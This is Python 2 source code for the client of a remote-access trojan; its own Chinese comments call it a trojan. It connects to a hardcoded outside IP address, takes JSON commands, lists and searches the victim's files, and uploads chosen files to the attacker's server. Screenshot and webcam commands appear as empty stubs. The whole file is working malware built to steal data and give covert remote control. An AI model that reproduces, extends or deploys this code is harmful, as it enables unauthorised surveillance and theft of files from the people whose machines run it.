#encoding=utf-8
import os
import socket
import time
import json
import urllib
import urllib2
import threading
import logging
from kit import files
from kit import uploadFile

listenPort=8091
trojanServerPort=8092

RecvCommandSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
trojanServerAddress=("119.29.5.72",trojanServerPort)
serverUrl="http://119.29.5.72:{}/clientcallback".format(listenPort)
uploadUrl="http://119.29.5.72:{}/upload".format(listenPort)

use_localhost=False

if(use_localhost==True):
    RecvCommandSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    trojanServerAddress=("127.0.0.1",trojanServerPort)
    RecvCommandSocket.connect(trojanServerAddress) #客户端接受服务端的通道
    serverUrl="http://127.0.0.1:{}/clientcallback".format(listenPort)
    uploadUrl="http://127.0.0.1:{}/upload".format(listenPort)
else:
    RecvCommandSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    trojanServerAddress=("119.29.5.72",trojanServerPort)
    RecvCommandSocket.connect(trojanServerAddress) #客户端接受服务端的通道
    serverUrl="http://119.29.5.72:{}/clientcallback".format(listenPort)
    uploadUrl="http://119.29.5.72:{}/upload".format(listenPort)


def SendResultToServer(toSendJsonString):
    global serverUrl
    data={"rawData":toSendJsonString}
    data = urllib.urlencode(data) 
    req  = urllib2.Request(serverUrl,data=data)  
    try:
        urllib2.urlopen(req)
    except Exception as e:
        print e
    print "Send result to server"

def RecvCommandHandler(conn,addr=("127.0.0.1",8077)):#潜在的bug
    global uploadUrl
    global trojanServerPort
    errorCount=20#错误重连次数
    print "Enter recving command mode"
    while True:
        try:
            commandJsonString=conn.recv(2048)
            print "Recv raw data=",commandJsonString
            command=json.loads(commandJsonString)
            commandType=command['Type']
            commandContent=command['Content']
            print "Recv command type:",commandType
            #执行对应指令并将结果写回服务器
            toSendJson={'Type':'','Content':''}

            if(commandType=="GetPathFiles"):
                toSendJson['Type']="GetPathFilesResult"#标记位为返回指定路径下的文件目录结果
                print "debug:path=",commandContent['filepath']
                toSendJson['Content']=files.filesView(commandContent['filepath'])
                toSendJsonString=json.dumps(toSendJson)
                print "debug:toSendJsonString=",toSendJsonString
                SendResultToServer(toSendJsonString)

            elif(commandType=="DownloadFile"):#服务器请求下载木马客户端上的某个文件
                toDownloadFileName=commandContent['filenamepath']
                filename=os.path.split(toDownloadFileName)[1]#获取文件名 除去了路径
                print "Upload {} to url {} ,split filename={}".format(toDownloadFileName,uploadUrl,filename)
                actionResult=uploadFile.uploadFileToServer(toDownloadFileName,uploadUrl)#这里可能要做成非阻塞式的 否则容易堵住
                #在上传完成之后返回成功信息给服务器
                toSendJson['Type']="DownloadFileResult"#标记位为返回指定路径下的文件目录结果
                toSendJson['Content']={
                    'actionResult':actionResult, #成功是 success:success
                                                #失败是 fail:xxx xxx表示原因
                    'filename':filename
                }
                toSendJsonString=json.dumps(toSendJson)
                SendResultToServer(toSendJsonString)

            elif(commandType=="SearchFile"): #搜索指定文件
                toSearchFileName=commandContent['searchname']
                searchResult=files.searchFile(toSearchFileName)
                toSendJson['Type']="SearchFileResult"
                toSendJson['Content']=searchResult
                toSendJsonString=json.dumps(toSendJson)
                SendResultToServer(toSendJsonString)

            elif(commandType=="Pwd"): #当前目录
                pwdResult=files.pwd()
                toSendJson['Type']="PwdResult"
                toSendJson['Content']={'path':pwdResult}
                toSendJsonString=json.dumps(toSendJson)
                SendResultToServer(toSendJsonString)

            elif(commandType=="GetScreenshot"):
                pass

            elif(commandType=="GetCamerashot"):
                pass
        except Exception as e:
            print e
            try:
                errorCount-=1
                time.sleep(2)
                RecvCommandSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                trojanServerAddress=("127.0.0.1",trojanServerPort)
                RecvCommandSocket.connect(trojanServerAddress) #客户端接受服务端的通道
                conn=RecvCommandSocket
            except:
                pass
        if(errorCount<=0):
            print "Too much errors ,kill connection"
            break

if __name__ == '__main__':
    RecvCommandServerThread = threading.Thread(target=RecvCommandHandler,args=(RecvCommandSocket,trojanServerAddress))
    RecvCommandServerThread.setDaemon(True)
    RecvCommandServerThread.start()#开启接受指令的后台线程
    logging.basicConfig(level=logging.DEBUG,
                        format="%(asctime)s [%(levelname)s] %(filename)s[%(lineno)d] %(message)s",
                        datefmt='%Y/%m/%d %H:%M:%S',
                        #filename='_server_.log',filemode='a'
                        )# debug info warning error cirtical
    try:
        while True:
            time.sleep(5)
    finally:
        RecvCommandSocket.close()
        print "Client exit."

